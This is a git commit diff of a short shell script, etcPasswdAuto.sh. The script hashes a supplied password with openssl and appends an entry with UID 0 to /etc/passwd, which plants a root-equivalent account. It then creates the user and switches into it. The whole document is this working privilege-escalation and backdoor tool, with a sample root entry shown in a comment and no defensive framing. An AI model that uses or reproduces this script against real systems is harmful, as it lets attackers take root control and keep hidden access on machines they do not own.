3898d96a28f029a80cd4019b6588fda21f0c0f7d
nclark50000 <47163748+nclark50000@users.noreply.github.com>
2020-03-29 12:34:20 -0700

    Add files via upload

--- etcPasswdAuto.sh
+++ etcPasswdAuto.sh
@@ -4,12 +4,11 @@
 PATH_SHELL=':0:0:root:/root:/bin/bash'
 LINE=`openssl passwd -1 -salt ${1} ${2}`
 NAME=${1}
-PASS=${2}
 COLON=':'
 FULL="$NAME$COLON$LINE$PATH_SHELL"
 # example passwd entry
 # nick:$1$nick$wpxLQpjimyPiRinw9Hj7W0:0:0:root:/root:/bin/bash
 echo $FULL >> /etc/passwd
-useradd -m ${1} #2> &/dev/null
-echo "Login to ${1}'s account"
+useradd -m ${1} 
+echo "Login to ${1}"
 su ${1}
